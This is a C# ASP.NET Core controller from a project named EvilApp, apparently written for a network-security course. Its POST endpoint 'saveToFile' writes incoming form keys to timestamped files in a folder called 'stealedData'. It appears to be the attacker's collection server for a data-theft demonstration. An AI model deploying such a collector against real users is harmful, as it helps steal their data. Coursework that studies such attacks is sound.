using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;

namespace EvilApp.Controllers
{
	[Route("api/[controller]")]
	[ApiController]
	public class DataController : ControllerBase
	{

		[HttpPost]
		[Route("saveToFile")]
		public IActionResult SaveToFile( string data)
		{
			// These examples assume a "D:\Projects\NetworkSecurityFinalProject\EvilApp\stealedData" folder on your machine.
			var path = @"D:\Projects\NetworkSecurityFinalProject\EvilApp\stealedData\";

			System.IO.File.WriteAllText(path + GetFileName(), Request.HasFormContentType ? string.Join('\n',Request.Form.Keys) : "");

			return Ok();
		}

		private string GetFileName()
		{
			var date = DateTime.Now;
			return date.Year.ToString() + date.Month + date.Day + date.Hour + date.Minute + date.Second + date.Millisecond + ".txt";
		}
	}
}